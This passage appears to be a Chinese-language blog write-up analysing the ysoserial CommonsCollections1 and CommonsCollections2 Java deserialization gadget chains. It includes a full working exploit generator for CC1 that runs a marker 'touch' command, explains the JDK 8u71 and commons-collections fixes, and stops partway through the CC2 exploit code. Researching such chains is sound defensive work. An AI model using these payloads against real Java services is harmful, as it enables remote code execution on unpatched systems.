<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>首先是版本受限, 先看 ysoserial 自带的版本检测 (单元测试的时候用的),  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isAnnInvHUniversalMethodImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    JavaVersion v = JavaVersion.getLocalVersion();</span><br><span class="line">    <span class="keyword">return</span> v != <span class="keyword">null</span> &amp;&amp; (v.major &lt; <span class="number">8</span> || (v.major == <span class="number">8</span> &amp;&amp; v.update &lt;= <span class="number">71</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>亲测 u71 实际已经修复了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 中的漏洞, 所以实际上 ysoseiral 检测的是有问题的…  </p>
<p>应该是 <code>v.update &lt; 71</code> 才对. 在 <code>https://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html</code> 可以下到老版 jdk.<br>以下代码均以小于 u71 的能下到的最新版本 u66 为例子.</p>
<p>这个链相对比较复杂, 所以倒着来, 从 <code>LazyMap.get()</code> 开始. </p>
<p>org.apache.commons.collections.map.LazyMap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 get 这个 map 时, 如果内部的 map 不存在这个 key, 将会调用 <code>this.factory.transform(key)</code>, 将结果作为返回值. 再来看属性定义  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br></pre></td></tr></table></figure>

<p>而 Transformer 是一个基类, ChainedTransformer, ConstantTransformer, InvokerTransformer 均继承于此父类. 接下来看如果通过 <code>this.factory.transform(key)</code> 达到 RCE 的效果.  </p>
<p>org.apache.commons.collections.functors.ChainedTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ChainedTransformer 的作用是将内部的 iTransformers 按顺序都调用一遍. </p>
<p>org.apache.commons.collections.functors.ConstantTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ConstantTransformer 的作用是不管输入, 直接返回一个常量.</p>
<p>最后是重点 org.apache.commons.collections.functors.InvokerTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个的作用是调用输入对象的一个方法, 并且参数可控, 这就非常牛逼了, 将这些结合起来, 如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/rmb122_pwned"</span>&#125;&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>

<p>这时调用 <code>chainedTransformer.transform</code>, 等价于 <code>java.lang.Runtime.getRuntime().exec(new String[]{&quot;/bin/touch&quot;, &quot;/dev/shm/rmb122_pwned&quot;})</code>,<br>将 chainedTransformer 作为 <code>Lazymap</code> 的 <code>factory</code>, 再 get 一个不存在的 key, 就能达到 RCE 的目的.</p>
<p>问题就是现在缺少一个在 readObject 时 get 的对象, 而且最好是 jre 内置的. 这里就可以看到作者的牛逼之处, 毕竟这些类可不是随便找找就能找到的.  </p>
<p>这里看 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 这个类的 <code>invoke</code> 方法,  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span></span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; paramClass, Map&lt;String, Object&gt; paramMap) &#123;</span><br><span class="line">    Class[] arrayOfClass = paramClass.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!paramClass.isAnnotation() || arrayOfClass.length != <span class="number">1</span> || arrayOfClass[<span class="keyword">false</span>] != Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>); </span><br><span class="line">    <span class="keyword">this</span>.type = paramClass;</span><br><span class="line">    <span class="keyword">this</span>.memberValues = paramMap;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object paramObject, Method paramMethod, Object[] paramArrayOfObject)</span> </span>&#123;</span><br><span class="line">    String str = paramMethod.getName();</span><br><span class="line">    Class[] arrayOfClass = paramMethod.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (str.equals(<span class="string">"equals"</span>) &amp;&amp; arrayOfClass.length == <span class="number">1</span> &amp;&amp; arrayOfClass[<span class="keyword">false</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(paramArrayOfObject[<span class="number">0</span>]); </span><br><span class="line">    <span class="keyword">if</span> (arrayOfClass.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">"Too many parameters for an annotation method"</span>); </span><br><span class="line">    <span class="keyword">switch</span> (str) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"toString"</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"hashCode"</span>:</span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(hashCodeImpl());</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"annotationType"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object object = <span class="keyword">this</span>.memberValues.get(str); <span class="comment">// &lt;--- 这里调用了 get, 而且 memberValues 也是 Map 类型, 可以把 LazyMap 放在这里</span></span><br><span class="line">    <span class="keyword">if</span> (object == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, str); </span><br><span class="line">    <span class="keyword">if</span> (object <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy)object).generateException(); </span><br><span class="line">    <span class="keyword">if</span> (object.getClass().isArray() &amp;&amp; Array.getLength(object) != <span class="number">0</span>)</span><br><span class="line">        object = cloneArray(object); </span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再来看这个类的 <code>readObject</code>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream paramObjectInputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    paramObjectInputStream.defaultReadObject();</span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException illegalArgumentException) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    Map map = annotationType.memberTypes();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry entry : <span class="keyword">this</span>.memberValues.entrySet()) &#123;</span><br><span class="line">        String str = (String)entry.getKey();</span><br><span class="line">        Class clazz = (Class)map.get(str);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object object = entry.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!clazz.isInstance(object) &amp;&amp; !(object <span class="keyword">instanceof</span> ExceptionProxy))</span><br><span class="line">                entry.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(object.getClass() + <span class="string">"["</span> + object + <span class="string">"]"</span>)).setMember((Method)annotationType.members().get(str))); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键点在 <code>this.memberValues.entrySet()</code>, 那么问题来了, 这里又跟 invoke 有什么关系呢.<br>这里涉及到 java 的动态代理机制, 这里不再赘述, 可以理解为调用这个方法实际上调用的是代理的 invoke, 在上面可以看到 AnnotationInvocationHandler 本身继承了 InvocationHandler 且重写了 invoke 方法. 刚好可以拿来利用, 接下来问题就很简单了, exp 如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/rmb122_pwned_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 因为构造方法不是 public, 只能通过反射构造出来</span></span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, invo);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Deprecated.class, proxy);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来问题是 java 是如何修复的呢? 一开始不知道已经修复, 复现出来导致还以为自己写错了 233<br>看到 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>才发现有可能是 java 内部类动过的原因.</p>
<p>拿最新版的 <code>readObject</code> 与上面 u66 版本的对比一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField fields = s.readFields();</span><br><span class="line">    Class&lt;? extends Annotation&gt; t = (Class)fields.get(<span class="string">"type"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map)fields.get(<span class="string">"memberValues"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(t);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String name;</span><br><span class="line">    Object value;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = streamVals.entrySet().iterator(); var8.hasNext(); mv.put(name, value)) &#123;</span><br><span class="line">        Entry&lt;String, Object&gt; memberValue = (Entry)var8.next();</span><br><span class="line">        name = (String)memberValue.getKey();</span><br><span class="line">        value = <span class="keyword">null</span>;</span><br><span class="line">        Class&lt;?&gt; memberType = (Class)memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!memberType.isInstance(value) &amp;&amp; !(value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                value = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>)).setMember((Method)annotationType.members().get(name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, t);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到很明显的两处变化是 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, t);</span><br><span class="line">AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, mv);</span><br></pre></td></tr></table></figure>

<p>其将反序列化后的 memberValues 设为了 mv, 而 mv 是  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, Object&gt; mv = <span class="keyword">new</span> LinkedHashMap();</span><br></pre></td></tr></table></figure>

<p>不是我们设置的 LazyMap, 这自然导致了在外层 AnnotationInvocationHandler 调用 proxy 时, 内层的 AnnotationInvocationHandler 的 memberValues 是 被重新设置的 LinkedHashMap, 而不是我们构造的 LazyMap, 自然就无法利用了.</p>
<p>看看 java 对 AnnotationInvocationHandler 的修复</p>
<p>ysoseiral 这个 exp 在 2015 年初被发布<br><img src="https://i.loli.net/2020/01/21/qfzXF9TOvtIoKxb.png" alt=""></p>
<p>查看 git 的 history, 可以看到在 2015 年 12 月被修复<br><img src="https://i.loli.net/2020/01/21/fBmpoH35E1hgj9e.png" alt="">  </p>
<p>java8u71 2016 年初发布<br><img src="https://i.loli.net/2020/01/21/RVu7qSnNl2FQBt6.png" alt="">  </p>
<p>再看 commons-collections3 的修复:</p>
<p><img src="https://i.loli.net/2020/01/23/XgxnUcD3A1rJFGb.png" alt="">  </p>
<p>在 readObject, writeObject 时都做了检测, 需要设置对应的 Property 为 true 才能反序列化 InvokerTransformer.  </p>
<p>看这个漏洞的历史, 也是非常有趣的. </p>
<h2 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2><p>还是先看调用栈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>这个 gadget 比较特殊的是用了 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个内置类, 这个类的骚操作就是, 在调用他的 <code>newTransformer</code> 或者 <code>getOutputProperties</code> (这个方法内部会调用 <code>newTransformer</code>) 时, 会动态从字节码中重建一个类. 这就使得如果我们能操作字节码, 就能在创建类时执任意 java 代码.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    TransformerImpl transformer = <span class="keyword">new</span> TransformerImpl(<span class="keyword">this</span>.getTransletInstance(), <span class="keyword">this</span>._outputProperties, <span class="keyword">this</span>._indentNumber, <span class="keyword">this</span>._tfactory);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(<span class="keyword">this</span>._uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._tfactory.getFeature(<span class="string">"http://javax.xml.XMLConstants/feature/secure-processing"</span>)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._name == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._class == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.defineTransletClasses(); <span class="comment">// 这个方法里面调用了 ClassLoader 加载 bytecode</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//... 省略</span></span><br></pre></td></tr></table></figure>

<p>同时在这个 gadget 中, 没有使用之前的 LazyMap, 而是使用的是 PriorityQueue + TransformingComparator 这套组合拳.<br>不过这个 exp 只对 CommonsCollections4 有效, 在 3 中 TransformingComparator 没有 implements Serializable, 导致无法序列化.  </p>
<p>java.util.PriorityQueue</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    s.readInt();</span><br><span class="line">    SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Object[].class, <span class="keyword">this</span>.size);</span><br><span class="line">    Object[] es = <span class="keyword">this</span>.queue = <span class="keyword">new</span> Object[Math.max(<span class="keyword">this</span>.size, <span class="number">1</span>)];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> n = <span class="keyword">this</span>.size; i &lt; n; ++i) &#123;</span><br><span class="line">        es[i] = s.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PriorityQueue readObject 时, 在读取完对象后, 会调用 heapify 来进行排序, 而排序方法是可以自定义的 (利用 Comparator 接口), 配合上 TransformingComparator.  </p>
<p>org.apache.commons.collections4.comparators.TransformingComparator (实现了 Comparator 接口)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在排序时会先 transform 一下, 再结合喜闻乐见的 InvokeTransfer, 导致 RCE.</p>
<p>最后 exp 如下: </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> </span>&#123;</span><br><span 